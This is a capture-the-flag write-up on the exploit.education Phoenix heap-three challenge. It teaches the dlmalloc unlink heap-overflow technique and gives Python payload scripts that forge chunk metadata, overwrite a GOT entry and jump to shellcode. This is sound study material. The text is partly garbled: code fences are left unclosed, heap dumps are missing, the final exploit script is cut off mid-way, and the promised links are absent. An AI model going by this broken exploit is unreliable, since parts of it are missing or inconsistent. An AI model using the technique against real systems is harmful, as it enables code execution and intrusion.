# Heap 3

Write-up for: [https://exploit.education/phoenix/heap-three/](https://exploit.education/phoenix/heap-three/).

<!--more-->

## The vulnerability

The program allocates three 32-byte buffers in the heap, copies user data into these
buffers without checking the bounds of the input and then frees the buffers. The calls
to `strcpy` are not bounds-checked and therefore prone to a heap-based buffer overflow.

## Executing winner

Our first goal is to execute the `winner` function. To do this, we need to overwrite the
GOT entry of `printf` which is called at the end of the `main` function. This means that
we will need an arbitrary write primitive.

We know that the [malloc implementation](ftp://gee.cs.oswego.edu/pub/misc/malloc-2.7.2.c) stores
metadata about allocated chunks next to the user data. Since we allocate multiple buffers in a row
and we can overflow the first two buffers, we can overwrite this metadata. How does the chunk structure
look like?

```C
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
```

This is a simplified representation of the actual chunks in memory since it ommits the actual user
data. Another aspect thats hidden in this struct definition is the fact that the `size` field contains
additional flags (the least-significant bits of the field). One of these flags (the LSB) indicates if
the **previous** chunk is free or not. If it is set, `prev_size` is also set. This will become interesting later on.
But first, let's look at our heap once before allocation and once after freeing the heap memory:

```

In the first print (before the `free` calls), we can see all three buffers are next to each other in memory. All three user buffers start with `0x00000029`. Since
this is nothing we entered, it must be the metadata for the heap manager. We know the buffers have a size of 32 bytes (0x20).
There are 8 bytes of heap metadata, so 0x28. But why 0x29? This one bit is the "is previous chunk in use" flag.

After freeing, the picture is different from what we expect. Normally, freed chunks are stored in a 'free list', a doubly-linked list from where the heap manager
can re-use chunks. This is where the `fd`, `bk` and prev_size fields come into play. So we would excpect at least two pointers and a size in our data, right?
If we look closely, we can see that there is one pointer per chunk:

```
0xf7e69000:     0x00000000      0x00000029      0xf7e69028      0x41414141
```

`0xf7e69028` clearly points to the next chunk (the one containing the 'B's). But what's missing is the `bk` pointer, as well as the `prev_size` field.
The reason for this is, that small chunks are organized in a so called 'fastbin' after freeing. This is a singly-linked list structure that is used as
an optimization for small-size allocations. Chunks in a fastbin can be re-used very quickly for allocations of the same size. This is also explained
in the `malloc` implementation:

```
/*
  Fastbins

    An array of lists holding recently freed small chunks.  Fastbins
    are not doubly linked.  It is faster to single-link them, and
    since chunks are never removed from the middles of these lists,
    double linking is not necessary. Also, unlike regular bins, they
    are not even processed in FIFO order (they use faster LIFO) since
    ordering doesn't much matter in the transient contexts in which
    fastbins are normally used.

    Chunks in fastbins keep their inuse bit set, so they cannot
    be consolidated with other free chunks. malloc_consolidate
    releases all chunks in fastbins and consolidates them with
    other free chunks. 
*/
```

There are other resources that explain this stuff way more in-depth and better than I could. For example check
out [Azeria Labs' excellent heap exploitation articles](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/).

Let's focus on how to use this knowledge for solving the challenge at hand.

The idea is to somehow
manipulate the heap manager into writing arbitrary data to a location of our choice. As a consequence,
we need to look for statements that write to memory in the normal code flow of the malloc implementation.
Following the `free` function's code flow, we will stumble accross the `unlink` macro:

```C
/* Take a chunk off a bin list */
#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  FD->bk = BK;                                                         \
  BK->fd = FD;                                                         \
}
```

This operation is just implementing the standard way of taking something off of a doubly-linked list. Calling this will
effectively remove `P` from the list by setting the backwards pointer of the next chunk (`FD->bk`) to
the backwards pointer of `P` (`BK`) and setting the forward pointer of the previous chunk (`BK->fd`) to
the forward pointer of `P` (`FD`). This is a write operation: the heap manager writes the value of `P->bk` to
the location specified by `FD.bk`. If we are able to control these values, we can write to a memory location of our choice!

This means if we can specify `bk` and `fd` of chunk `P` the value of `bk` will be written to the address specified at `fd + 12`.
Let's have a look at the call of `unlink`:

```C
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = p->prev_size;
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(p, bck, fwd);
}
```

As you can see, the `P` we want to modify is actually the chunk at the offset of the chunk we call `free` on and its `prev_size` field.
`bck` and `fwd` are temporary variables. Let's rewrite the unlink macro in the context of the `c` chunk during the first `free` call: 

```C
prev = (c - c->prev_size);
*(prev->fd + 12) = prev->bk;
*(prev->bk + 8) = prev->fd;
```

This indicates that we need to set `prev_size` so that we can control the `fd` and `bk` values.

However, as we saw above, this unlink macro is **not** called for freed chunks in fastbins. How does the heap manager determine if a freed
chunk goes to a fastbin? The answer can be found in the implementation of `free`:

```C
/*
  If eligible, place chunk on a fastbin so it can be found
  and used quickly in malloc.
*/

if ((CHUNK_SIZE_T)(size) <= (CHUNK_SIZE_T)(av->max_fast)
```

Looking around the malloc source we find the definition for the maximum size of chunk that goes to fastbins:

```C
/* The maximum fastbin request size we support */
#define MAX_FAST_SIZE     80
```

In reality, this might be smaller than 80 because it is configurable.

Now we have all the information we need. We can now use the overflow to construct the second and third heap chunks in a way that
ensures that `unlink` is called. We also provide the address we want to write to and the word we want to write inside of this payload.
To recap:

- `size` of chunk to be freed must be greater than 80 to avoid fastbin handling
- `prev_inuse` flag must be unset, so that during the free operation, `b` and `c` are coalesced using `unlink`
- `prev_size` must be safe to be subtracted from a pointer. Also it cannot contain null bytes

As a value for `prev_size` we can use `0xfffffffc`. This fulfills two properties. Since this value is cast to `long`
in the `prev` calculation, it is interpreted as `-4`. This is safe to subtract from the current chunk pointer as it is
very small (in fact, we will add 4). Additionally, the LSB is set to zero, so we will call `unlink` as intended.

So basically we write the value at `c + 4 (prev_size) + 12` (prev->bk) to the address specified at `c + 4 (prev_size) + 8` + 12 (prev->fd).

This results in the following payload generation. We put random values for the write value and target address for now
to check if it works. We expect to see a write access violation from within the `unlink` macro.

```python
import struct

payload = ""
payload = payload + "A" * 32 # buf a

payload = payload + " " +  "B" * 32  # buf b 

# overwriting into chunk c
payload = payload + struct.pack("<I", 0xfffffffc) # prev_size
payload = payload + struct.pack("<I", 0xfffffffc) # size, must be greater than 80
payload = payload + "\xff\xff\xff\xff" # 4 bytes of chunk, since prev_size is 4
payload = payload + struct.pack("<I", 0xdeadbeef - 12) # TARGET 
payload = payload + struct.pack("<I", 0xdeadbeef) # WORD TO WRITE


# satisfy strcpy for third argument
payload = payload + " CCCC"

print(payload)
```

It worked! As you can see, the program is trying to write `0xdeadbeef` to `0xdeadbe00 + 0xc`:

```
→  0x8049941 <free+234>       mov    DWORD PTR [eax+0xc], edx
$eax   : 0xdeadbe00
$ebx   : 0xffffdcf0  →  0x00000004
$ecx   : 0x0
$edx   : 0xdeadbeef
````

Now we need to figure out what we want to write where in order to redirect execution to the `winner` function.
What comes to mind is overwriting the GOT entry for `puts` which is called after the `free` calls.

First, we need to find the address of `puts` in the PLT and of the `winner` function:

```
(gdb) disas winner
Dump of assembler code for function winner:
   0x080487d5 <+0>:     push   ebp

(gdb) disas 'puts@plt'
Dump of assembler code for function puts@plt:
   0x080485b0 <+0>:     jmp    DWORD PTR ds:0x804c13c
   0x080485b6 <+6>:     push   0x28
   0x080485bb <+11>:    jmp    0x8048550
```

Now we change the payload and run the exploit.

```
(gdb) run $(python heap3.py)

Segfault? What happened here? If you look closely at the instructions, it becomes clear. We forgot about the second write
that is executed during `unlink`:

```C
*(prev->bk + 8) = prev->fd;

mov    DWORD PTR [eax+0x8], edx
```

This means we are writing something 8 bytes after the start of the `winner` function (the address of which is in `prev->bk`).
This section of memory is flagged as read-only and thus the program crashes. We need a different strategy keeping the fact
in mind that both `prev->bk + 8` and  `prev->fd + 12` must be writable addresses.

Our new strategy is to place a short shellcode on the heap and store the address of this shellcode in `puts@plt`. The shellcode
will then call the `winner` function. This additional indirection ensures that the second write happens in a writable memory
segment (the heap). We generate shellcode using the [pwntools library](http://docs.pwntools.com/en/stable/asm.html) and embed
it in our payload. Then we modify the word to write to be the address of our shellcode. We don't care about the second write since
our shellcode is sufficiently short. The address of the shellcode is always the same on the system since ASLR is not enabled. We
can find the address of the heap using gdb (the first segment after the program):

```
 (gdb) info proc mappings
process 9561
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile

```

This results in a new exploit:

```python
import struct
import pwnlib

shellcode = "push 0x080487d5; ret" # call winner
shellcode = pwnlib.asm.asm(shellcode)

# First argument
payload = ""
payload = payload + "\x90" * 16 + shellcode # buffer a with shellcode and NOP sled

# Second argument
payload = payload + " " +  "B" * 32  # buffer b 

# overwriting into chunk c
payload = payload + struct.pack("<I", 0xfffffffc) # prev_size, -4 so we can control prev->bk and prev->fd
payload = payload + struct.pack("<I", 0xfffffffc) # size

# Third argument 
payload = payload + " " + "\xff\xff\xff\xff" # 4 bytes of chunk, since prev_size is -4
payload = payload + struct.pack("<I", 0x804c13c - 12) # TARGET, puts@plt 
payload = payload + struct.pack("<I", 0xf7e69000 + 16 + 8) # WORD TO WRITE, address of shellcode / buffer a

print(payload)
```

Let's run it:

```
(gdb) run $(python heap3.py)
Starting program: /opt/phoenix/i486/heap-three $(python heap3.py)

Program received signal SIGSEGV, Segmentation fault.

→  0x8049994 <free+317>       mov    DWORD PTR [eax+0xc], edx
```

We see yet another segfault during a familiar looking write operation. However, if we look closely, this is not the first unlink that
we were targeting (which was at `free+234`). Re-visiting the malloc implementation reveals what happens:

```C
if (nextchunk != av->top) {
	/* get and clear inuse bit */
	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
	set_head(nextchunk, nextsize);

	/* consolidate forward */
	if (!nextinuse) {
	  unlink(nextchunk, bck, fwd);
	  size += nextsize;
	}
...
``` 

After successfully consolidating backwards with our crafted values, this code is executed. If the `nextchunk`, which is calculated to be at
`p + p->size`, is not the last chunk and the next chunk is not in use, it is also consolidated via `unlink`. Since we control `p->size` for our
crafted chunk, we can set it so that we do not take this branch. It has to fulfill these conditions:

- Contains no null bytes
- `p + p->size` points to a chunk that is in use, i.e. the is previous in use flag is not set in the following chunk

The ideal candidate is chunk a. We can set `size` to -80 which tricks the malloc implementation into thinking the next chunk is chunk a.
Let's try again:

```python
import struct
import pwnlib

shellcode = "push 0x080487d5; ret" # call winner
shellcode = pwnlib.asm.asm(shellcode)

# First argument
payload = ""
payload = payload + "\x90" * 16 + shellcode # buffer a with shellcode and NOP sled

# Second argument

## Final words

For me personally, this was by far the hardest challenge on exploit.education, yet. It took me a lot of time to understand this type of attack
and to implement it myself. So don't be discouraged if you don't understand what's going on right away. Once you do, this
is a pretty eye opening exercise since we now advanced from simply overwriting some values in memory to carefully manipulating
the control flow of a program in order to execute our own code. I highly recommend reading the Phrack papers linked below that originally
discussed exploiting the `unlink` macro.
